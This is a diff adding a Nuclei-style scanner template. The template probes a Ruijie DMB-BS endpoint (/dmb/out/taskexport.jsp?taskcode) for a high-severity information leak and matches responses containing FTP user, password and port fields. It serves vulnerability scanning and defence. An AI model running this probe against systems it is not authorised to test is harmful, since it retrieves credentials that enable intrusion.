@@ -1,0 +1,29 @@
+id: XingWangRuiJie_DMB-BS-taskexport-InfoLeak
+
+info:
+  name: XingWangRuiJie_DMB-BS-taskexport-InfoLeak
+  author: iSee857
+  severity: high
+  description: |
+    XingWangRuiJie_DMB-BS-taskexport-InfoLeak.
+
+http:
+  - raw:
+      - |
+        GET /dmb/out/taskexport.jsp?taskcode HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "pwd"
+          - "ftp"
+          - "user"
+          - "port"
+        condition: and
+        part: body
+
+      - type: status
+        status:
+          - 200
